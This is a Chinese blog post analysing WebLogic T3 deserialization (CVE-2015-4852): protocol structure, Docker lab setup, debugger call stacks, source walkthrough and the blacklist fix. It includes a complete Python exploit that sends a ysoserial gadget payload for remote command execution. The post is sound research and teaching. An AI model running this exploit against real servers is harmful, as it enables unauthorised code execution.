        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>48 分钟</span>
    </span>
</div>

            <div class="post-description">Weblogic中间件的相关利用及漏洞分析</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方介绍：Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。类似于Tomcat、Jboss等。<br><strong>安装</strong>：<br>Windows下的安装教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xrg-blog/p/12779853.html">https://www.cnblogs.com/xrg-blog/p/12779853.html</a><br>Linux下的安装教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vhua/p/weblogic_1.html">https://www.cnblogs.com/vhua/p/weblogic_1.html</a><br><strong>其他</strong>：</p>
<ul>
<li>weblogic登录界面默认端口是7001，可在<code>%weblogic%\user_projects\domains\base_domain\config\config.xml</code>中修改端口<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qlqwjy/p/9685924.html">https://www.cnblogs.com/qlqwjy/p/9685924.html</a></li>
</ul>
<h1 id="漏洞合集"><a href="#漏洞合集" class="headerlink" title="漏洞合集"></a>漏洞合集</h1><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞</p>
<h2 id="基于T3协议"><a href="#基于T3协议" class="headerlink" title="基于T3协议"></a>基于T3协议</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>T3协议概述</strong>：在RMI通信过程中，正常传输反序列化的数据过程中，通信使用的是JRMP协议，但是在weblogic的RMI通信过程中使用的是T3协议<br><strong>特点</strong>：</p>
<ul>
<li>服务端可以持续追踪监控客户端是否存活，即为心跳机制</li>
<li>通过建立一次连接可以将全部数据包传输完成</li>
</ul>
<p><strong>数据交换过程</strong>：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801182042.png"><br><strong>结构</strong>：<br>T3协议中包含请求包头和请求包体两部分<br>请求头：<br>以下面的CVE-2015-4852中的exp请求为例，第一步客户端向服务器发送请求头，得到服务端的响应，抓包分析：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i ens160 port 7001 -w t3.pcap</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表示协议版本号或者数据包类型等信息的字段</span></span><br><span class="line">t3 <span class="number">12.2</span><span class="number">.3</span></span><br><span class="line"><span class="comment">// 标识了发送的序列化数据的容量</span></span><br><span class="line">AS:<span class="number">255</span></span><br><span class="line"><span class="comment">// 标识自己后面发起的t3的协议头长度</span></span><br><span class="line">HL:<span class="number">19</span></span><br><span class="line"><span class="comment">// Maximum Segment Size</span></span><br><span class="line">MS:<span class="number">10000000</span></span><br></pre></td></tr></table></figure>

<p>服务端的响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HELO:<span class="number">10.3</span><span class="number">.6</span><span class="number">.0</span>.<span class="literal">false</span></span><br><span class="line">AS:<span class="number">2048</span></span><br><span class="line">HL:<span class="number">19</span></span><br></pre></td></tr></table></figure>

<p>HELO后面会返回一个weblogic版本号<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801144420.png"><br>请求体：<br>蓝色部分就是响应，下面部分就是请求体，构造的恶意类就在其中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801145708.png"><br>请求头+请求体：</p>
<ul>
<li>每个T3数据包中都包含T3协议头</li>
<li>数据包的前4个字节标识了数据包的长度</li>
<li>序列化数据的头部二进制为aced0005</li>
<li>长度标识后面的一个字节标识了该数据包是请求还是响应，01表示请求，02表示响应</li>
</ul>
<p>根据T3协议的特点，在攻击的时候只需要将恶意的反序列化数据进行拼接即可，参考一张图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801150754.png"></p>
<h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p><strong>环境搭建</strong>：<br>使用QAX-A-Team的weblogic搭建环境：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a><br>同时需要下载JDK和weblogic，并将其对应放入项目的jdk文件夹和weblogic文件夹，版本的兼容性测试在项目的README文件兼容性测试中提到，按照要求下载对应版本即可<br>构建docker并运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 .</span><br><span class="line">sudo docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://10.140.32.159:33401/console/login/LoginForm.jsp%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8Dweblogic%EF%BC%8C%E5%AF%86%E7%A0%81%EF%BC%9Aqaxateam01">http://10.140.32.159:33401/console/login/LoginForm.jsp，用户名weblogic，密码：qaxateam01</a><br>设置远程调试：<br>运行对应版本的sh脚本，安装远程调试并从docker中导出jar包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./run_weblogic1036jdk7u21.sh</span><br></pre></td></tr></table></figure>

<p>在项目目录中会生成middleware文件夹，将其导出放入IDEA中并配置远程调试<br>新建一个IDEA项目，导入modules和wlserver，建立远程运行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731144444.png"><br>测试：在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的readObject函数中下断点，使用<a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan.git">weblogic漏洞扫描工具</a>扫描<br>最后能够停在断点处则表示远程调试设置成功</p>
<p><strong>漏洞复现</strong>：<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;../ysoserial-all.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;C:/Program Files/Java/jdk1.7.0_80/bin/java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;10.140.32.159&quot;</span></span><br><span class="line">    port = <span class="number">33401</span></span><br><span class="line">    gadget = <span class="string">&quot;Jdk7u21&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;touch /tmp/CVE-2015-4852&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>

<p>执行完成后，查询是否新建CVE-2015-4852文件<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731165503.png"><br>命令执行成功</p>
<p><strong>漏洞分析</strong>：<br>在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的readObject函数中下断点，执行exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 从输入流var1中读取一个字节，并将其赋值给变量var2，该字节表示序列化对象的类型</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> var1.read();</span><br><span class="line">    <span class="keyword">switch</span> (var2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="comment">// 需要读取一个自定义的序列化类型的对象</span></span><br><span class="line">            <span class="comment">// 进入这里</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ServerChannelInputStream</span>(var1)).readObject();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// 表示需要读取一个ASCII字符串</span></span><br><span class="line">            <span class="keyword">return</span> var1.readASCII();</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Unknown typecode: &#x27;&quot;</span> + var2 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于var2的值是0，所以会进入ServerChannelInputStream的readObject函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230731175814.png"><br>这里的ServerChannelInputStream是一个内部类，实现如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerChannelInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> <span class="keyword">implements</span> <span class="title class_">ServerChannelStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ServerChannel serverChannel;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ServerChannelInputStream</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">        <span class="built_in">this</span>.serverChannel = var1.getServerChannel();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServerChannel <span class="title function_">getServerChannel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.serverChannel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是ServerChannelInputStream类重写的ObjectInputStream类的方法，它在反序列化Java对象时负责解析类，将类的序列化描述符加工成该类的Class对象</span></span><br><span class="line">    <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass var1)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">// 调用父类的resolveClass方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">var3</span> <span class="operator">=</span> ObjectStreamClass.lookup(var2);</span><br><span class="line">            <span class="comment">// 检查解析出来的Java类与要解析的类是否具有相同的serialVersionUID</span></span><br><span class="line">            <span class="keyword">if</span> (var3 != <span class="literal">null</span> &amp;&amp; var3.getSerialVersionUID() != var1.getSerialVersionUID()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;different serialVersionUID. local: &quot;</span> + var3.getSerialVersionUID() + <span class="string">&quot; remote: &quot;</span> + var1.getSerialVersionUID());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> var2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中在构造方法中，调用getServerChannel函数处理T3协议，获取socket相关信息<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801095953.png"><br>父类(即ObjectInputStream)的resolveClass方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中通过Class.forName，根据类名来获取对应类的Class对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801000434.png"><br>函数调用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">resolveClass:<span class="number">108</span>, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)</span><br><span class="line">readNonProxyDesc:<span class="number">1610</span>, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:<span class="number">1515</span>, ObjectInputStream (java.io)</span><br><span class="line">readClass:<span class="number">1481</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1331</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadObject:<span class="number">499</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">331</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">308</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>接下来就是ysoserial中Jdk7u21链的部分，这里可以更改exp中的参数，使用CC链也可<br>这里将gadget参数更改为CommonsCollections1，使用CC1链<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">157</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">69</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy96 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">346</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:-<span class="number">1</span>, GeneratedMethodAccessor89 (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801173538.png"></p>
<p><strong>修复</strong>：<br>在出现这个漏洞之后，weblogic增加了一些安全防护，防护方案主要从resolveClass入手，如图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801155140.png"><br>由上面可知，resolveClass函数的作用是从类序列化描述符获取类的Class对象，而具体的防御措施就是在这个函数中增加一个检查，检测序列化描述符是否出现在设置的黑名单中<br><strong>总结</strong>：<br>weblogic反序列化攻击流程图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801204957.png"><br>反序列化攻击时序图：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230801205137.png"><br><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10563">WeblogicT3反序列化浅析之cve-2015-4852</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9216">Weblogic反序列化漏洞利用入门——CVE-2015-4852</a></p>
